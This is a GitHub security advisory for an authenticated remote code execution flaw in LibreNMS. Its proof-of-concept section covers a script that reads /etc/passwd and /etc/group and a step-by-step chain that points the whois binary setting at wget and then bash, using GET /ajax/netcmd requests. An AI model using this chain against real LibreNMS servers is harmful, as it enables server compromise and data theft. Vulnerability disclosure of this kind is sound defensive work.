# [H] LibreNMS is Vulnerable to Remote Code Execution by Arbitrary File Write

## Summary
Severity: High
Advisory: GHSA-pr3g-phhr-h8fh
CVE: CVE-2026-6204
CWE: CWE-78
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-pr3g-phhr-h8fh
Type: github-advisory

## Affected
- Packagist: `librenms/librenms` — affected >=1.48 <26.3.0

## Details
### Summary
A vulnerability has been identified that allows an authenticated administrator to execute arbitrary code on the host server. By modifying the binary path settings for built-in network tools and bypassing an input filter, an attacker with administrative privileges can download and execute malicious payloads.

### Details
The application allows administrative users to configure the absolute binary paths for network diagnostic tools at `/settings/external/binaries`. This setting does not sufficiently validate ensuring the paths remain restricted to safe, intended executables. These tools are invoked by sending a request to the `GET /ajax/netcmd` endpoint. While there is an existing input filter designed to restrict arguments to valid IP addresses or hostnames, this filter can be bypassed.

### PoC
To reproduce this vulnerability, a remote HTTP server should be hosted with a malicious script/executable, ensure the remote server is reachable by the server running LibreNMS. The PoC will use the file `malicious.sh` containing the following content. It will return the content of /etc/passwd and /etc/group, current working directory, username that is running the script, and it will list files of the current directory.

```bash
#!/usr/bin/env bash

cat /etc/passwd
cat /etc/group
whoami
pwd
ls
```

1. Host a remote HTTP server that the server can reach and place the malicious script on the remote server. For demonstration, I will start it on localhost.
<img width="593" height="481" alt="image" src="https://github.com/user-attachments/assets/ef235f8e-089b-462c-b12c-7b5ae2037fc5" />

2. Make sure the malicious script `malicious.sh` can be downloaded. 
<img width="516" height="100" alt="image" src="https://github.com/user-attachments/assets/60b04755-e824-4384-81f2-2feacdc8e273" />

3. Login with an admin account and navigate to Global Settings -> External -> Binary Locations
<img width="797" height="201" alt="image" src="https://github.com/user-attachments/assets/f914cc9e-f45b-444f-8f16-058101d84576" />

4. Change the whois binary path to the path of wget (e.g. /usr/bin/wget).
<img width="478" height="58" alt="image" src="https://github.com/user-attachments/assets/57fbf033-ff07-41dc-9bac-2f3b3e897ea6" />

5. Send the request `GET /ajax/netcmd?cmd=whois&query={remote http server's ip address}/malicious.sh`. The response should contain wget's output, and malicious.sh would be downloaded by the server.
<img width="900" height="209" alt="image" src="https://github.com/user-attachments/assets/942b6082-18db-4838-b06c-b98d7fa1f8d0" />

6. After that, change the whois binary path to the path of bash (e.g. /bin/bash). 
<img width="751" height="56" alt="image" src="https://github.com/user-attachments/assets/0c11d86e-0dab-4780-bdb7-f328bbb758f8" />

7. Send the request GET /ajax/netcmd?cmd=whois&query=malicious.sh to execute the script. 
<img width="846" height="688" alt="image" src="https://github.com/user-attachments/assets/d4dcf8e9-5a75-407c-8dd4-96d11f090dbe" />

### Impact
This vulnerability allows a malicious actor to achieve Remote Code Execution (RCE), potentially leading to complete system compromise, data exfiltration, or lateral movement within the network.

### Remediation Advice
Loading Binary Path from a config file instead of exposing settings in WebUI can eliminate this issue. If it is not possible, enforcing more validations and fix the `ip_or_hostname` bypass in https://github.com/librenms/librenms/blob/master/app/Providers/AppServiceProvider.php#L169 to reduce the risk of RCE.

### Prerequisite
The attacker must have a valid Administrator account to exploit this vulnerability.

## References
- https://github.com/librenms/librenms/security/advisories/GHSA-pr3g-phhr-h8fh
- https://nvd.nist.gov/vuln/detail/CVE-2026-6204
- https://github.com/librenms/librenms
- https://github.com/librenms/librenms/blob/master/app/Providers/AppServiceProvider.php#L169
- https://projectblack.io/blog/librenms-authenticated-rce-and-xss/#binary-path-rce-poc
